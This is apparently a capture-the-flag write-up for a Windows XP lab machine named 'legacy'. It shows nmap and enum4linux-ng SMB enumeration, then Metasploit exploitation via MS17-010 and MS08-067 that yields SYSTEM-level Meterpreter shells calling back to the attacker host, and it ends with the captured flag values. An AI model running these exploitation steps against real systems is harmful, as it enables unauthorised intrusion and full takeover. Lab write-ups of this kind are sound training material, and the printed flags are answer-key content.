Using nmap to scan 445 SMB

```php
nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln* 10.129.227.181
```

We found these two common vulnerabilities from the scan

```php
Remote Code Execution vulnerability in Microsoft SMBv1 servers
CVE-2017-0143

Microsoft Windows system vulnerable to remote code execution
CVE-2008-4250
```

We found shares for `ADMIN$`, `C$`, `IPC$`

```php
enum4linux-ng 10.129.227.181
```

We found some version info on the machines OS

```php
OS: Windows 5.1
OS version: '5.1'
OS release: not supported
OS build: not supported
Native OS: Windows 5.1
```

Not too much useful info on `enum4linux`

```php
crackmapexec smb 10.129.227.181
```

From our output we find that SMB signing is not required 
I try to run `smbclient` but yield no results...
## CVE-2017-0143

The staged version of the exploit failed on us

```php
exploit(windows/smb/ms17_010_eternalblue)
[*] 10.129.227.181:445    - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.227.181:445 - The target is vulnerable.
[-] 10.129.227.181:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets
[*] Exploit completed, but no session was created.
```

Non staged version landed us a shell

```php
exploit(windows/smb/ms17_010_psexec)
meterpreter > shell
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
```

We have gained a root shell on legacy

```php
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
## CVE-2008-4250
We have plenty of options

Landed us a shell on the system

```php
exploit(windows/smb/ms08_067_netapi)
[*] Meterpreter session 2 opened (10.10.14.209:4444 -> 10.129.227.181:1045) at 2025-06-02 07:30:55 -0400
meterpreter > 
```

We have gained a root shell on legacy

```php
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Exploring the directories we find the flags for user john and the administrator user

User John: `e69af0e4f443de7e36876fda4ec7644f`
User Admin: `993442d258b0e0ec917cae9e695d5713`
